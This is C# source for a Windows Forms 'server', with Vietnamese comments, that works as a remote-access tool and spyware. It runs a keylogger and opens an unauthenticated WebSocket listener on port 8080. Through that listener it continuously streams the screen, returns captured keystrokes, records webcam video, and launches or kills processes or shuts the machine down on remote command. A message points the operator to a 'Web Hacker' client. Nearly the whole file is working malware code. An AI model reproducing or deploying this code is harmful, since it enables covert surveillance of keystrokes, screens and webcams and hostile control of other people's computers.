using System;
using System.Windows.Forms;
using System.Net;
using System.Net.WebSockets; // QUAN TRỌNG: Thư viện WebSocket
using System.IO;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Text;
using KeyLogger; // Đảm bảo namespace này khớp với file Keylog.cs
using AForge.Video;
using AForge.Video.DirectShow;
using Accord.Video.FFMPEG;

namespace server
{
    public partial class server : Form
    {
        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern int mciSendString(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);

        public server() { InitializeComponent(); CheckForIllegalCrossThreadCalls = false; }

        private void button1_Click(object sender, EventArgs e)
        {
            // 1. KÍCH HOẠT KEYLOG
            Thread tklog = new Thread(new ThreadStart(KeyLogger.InterceptKeys.startKLog));
            tklog.SetApartmentState(ApartmentState.STA); tklog.Start();

            // 2. KÍCH HOẠT WEBSOCKET SERVER
            Task.Run(() => StartWebSocketServer());

            button1.Text = "SERVER ĐANG CHẠY..."; button1.Enabled = false;

            // Lấy IP để hiển thị
            string ip = "127.0.0.1";
            try
            {
                foreach (var i in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
                    if (i.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork) { ip = i.ToString(); break; }
            }
            catch { }
            MessageBox.Show($"Server OK!\nIP: {ip}\nNhập IP này vào Web Hacker.");
        }

        private async Task StartWebSocketServer()
        {
            HttpListener listener = new HttpListener();
            listener.Prefixes.Add("http://*:8080/"); // Mở cổng 8080
            try { listener.Start(); } catch { MessageBox.Show("LỖI: Phải chạy Run As Administrator!"); return; }

            while (true)
            {
                HttpListenerContext ctx = await listener.GetContextAsync();
                if (ctx.Request.IsWebSocketRequest) ProcessWs(ctx); // Nếu là WebSocket thì xử lý
                else { ctx.Response.StatusCode = 400; ctx.Response.Close(); }
            }
        }

        private async void ProcessWs(HttpListenerContext ctx)
        {
            HttpListenerWebSocketContext wsCtx = await ctx.AcceptWebSocketAsync(null);
            WebSocket ws = wsCtx.WebSocket;   // ⭐ KHỞI TẠO ws TỪ wsCtx

            globalWS = ws;       // ⭐ LƯU VÀO GLOBAL
            StartStreaming();    // ⭐ BẮT ĐẦU STREAM SHARE SCREEN

            byte[] buf = new byte[1024 * 5000];

            while (ws.State == WebSocketState.Open)
            {
                try
                {
                    WebSocketReceiveResult res = await ws.ReceiveAsync(
                        new ArraySegment<byte>(buf), CancellationToken.None);

                    if (res.MessageType == WebSocketMessageType.Close) break;

                    string cmd = Encoding.UTF8.GetString(buf, 0, res.Count);
                    string reply = Exec(cmd);

                    byte[] outBuf = Encoding.UTF8.GetBytes(reply);
                    await ws.SendAsync(new ArraySegment<byte>(outBuf),
                        WebSocketMessageType.Text, true, CancellationToken.None);
                }
                catch { break; }
            }
        }


        // XỬ LÝ LỆNH TỪ WEB CLIENT
        private string Exec(string cmd)
        {
            try
            {
                string[] p = cmd.Split('|');
                switch (p[0])
                {
                    case "SHUTDOWN": Process.Start("shutdown", "/s /t 0"); return "LOG: Đang tắt...";
                    case "RESTART": Process.Start("shutdown", "/r /t 0"); return "LOG: Đang restart...";
                    case "KEYLOG":
                        string l = ""; lock (KeyLogger.appstart.logLock) { l = KeyLogger.appstart.logBuffer.ToString(); }
                        return "KEYLOG|" + l;
                    case "LIST_APP": return "LIST_APP|" + GetProcs();
                    case "START": Process.Start(p[1]); return "LOG: Đã mở " + p[1];
                    case "KILL": Process.GetProcessById(int.Parse(p[1])).Kill(); return "LOG: Đã diệt " + p[1];
                    case "SCREENSHOT":
                {
                    SaveScreenshot();
                    return "LOG: Screenshot saved.";

                }

                    case "WEBCAM":
                        string v = RecVid(10);
                        if (File.Exists(v)) { byte[] b = File.ReadAllBytes(v); File.Delete(v); return "VID|" + Convert.ToBase64String(b); }
                        return "LOG: Lỗi Webcam";
                }
            }
            catch (Exception ex) { return "LOG: Lỗi " + ex.Message; }
            return "";
        }

        string GetProcs()
        {
            StringBuilder sb = new StringBuilder();
            foreach (Process p in Process.GetProcesses())
                if (!string.IsNullOrEmpty(p.MainWindowTitle)) sb.Append($"{p.Id},{p.MainWindowTitle};");
            return sb.ToString();
        }

        private byte[] CapScreen()
        {
            Rectangle bounds = SystemInformation.VirtualScreen;

            using (Bitmap bmp = new Bitmap(bounds.Width, bounds.Height))
            using (Graphics g = Graphics.FromImage(bmp))
            using (MemoryStream ms = new MemoryStream())
            {
                g.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size);

                bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                return ms.ToArray();
            }
        }

        // Phương thức để lưu ảnh vào tệp
        private void SaveScreenshot()
        {
            Thread t = new Thread(() =>
            {
                byte[] screenshot = CapScreen();

                using (SaveFileDialog save = new SaveFileDialog())
                {
                    save.Filter = "PNG Files (*.png)|*.png|JPEG Files (*.jpg)|*.jpg";
                    save.FilterIndex = 1;

                    if (save.ShowDialog() == DialogResult.OK)
                    {
                        File.WriteAllBytes(save.FileName, screenshot);
                        MessageBox.Show("Ảnh đã được lưu tại: " + save.FileName);
                    }
                }
            });

            t.SetApartmentState(ApartmentState.STA); // ⚠ BẮT BUỘC
            t.Start();
        }


        public string RecVid(int seconds)
        {
            try
            {
                // Lấy danh sách webcam
                var videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                if (videoDevices.Count == 0) return "LOG: Không tìm thấy webcam!";

                // Chọn webcam đầu tiên
                var videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);

                // Hộp thoại lưu file
                string savePath = "";
                Thread t = new Thread(() =>
                {
                    using (SaveFileDialog save = new SaveFileDialog())
                    {
                        save.Filter = "AVI Video (*.avi)|*.avi";
                        save.Title = "Chọn nơi lưu video webcam";
                        save.FileName = "webcam_record.avi";

                        if (save.ShowDialog() == DialogResult.OK)
                        {
                            savePath = save.FileName;
                        }
                    }
                });

                t.SetApartmentState(ApartmentState.STA);
                t.Start();
                t.Join();

                if (string.IsNullOrEmpty(savePath))
                    return "LOG: Không chọn đường dẫn lưu video.";

                var writer = new Accord.Video.FFMPEG.VideoFileWriter();
                bool writerOpened = false;

                videoSource.NewFrame += (s, e) =>
                {
                    try
                    {
                        Bitmap frame = (Bitmap)e.Frame.Clone();

                        if (!writerOpened)
                        {
                            writer.Open(savePath, frame.Width, frame.Height, 30,
                                Accord.Video.FFMPEG.VideoCodec.MPEG4);

                            writerOpened = true;
                        }

                        writer.WriteVideoFrame(frame);
                        frame.Dispose();
                    }
                    catch { }
                };

                // BẮT ĐẦU QUAY
                videoSource.Start();

                Thread.Sleep(seconds * 1000);

                // DỪNG CAMERA
                videoSource.SignalToStop();
                while (videoSource.IsRunning) Thread.Sleep(100);

                if (writerOpened)
                    writer.Close();

                return "LOG: Video đã lưu tại: " + savePath;
            }
            catch (Exception ex)
            {
                return "LOG: Lỗi quay webcam: " + ex.Message;
            }
        }

        WebSocket globalWS = null;

        void StartStreaming()
        {
            new Thread(async () =>
            {
                while (true)
                {
                    try
                    {
                        if (globalWS != null && globalWS.State == WebSocketState.Open)
                        {
                            byte[] img = CapScreen();
                            string base64 = Convert.ToBase64String(img);
                            byte[] send = Encoding.UTF8.GetBytes("LIVE|" + base64);

                            await globalWS.SendAsync(new ArraySegment<byte>(send),
                                WebSocketMessageType.Text, true, CancellationToken.None);
                        }
                    }
                    catch { }

                    Thread.Sleep(100); // stream ~10 fps
                }
            })
            { IsBackground = true }.Start();
        }


    }
}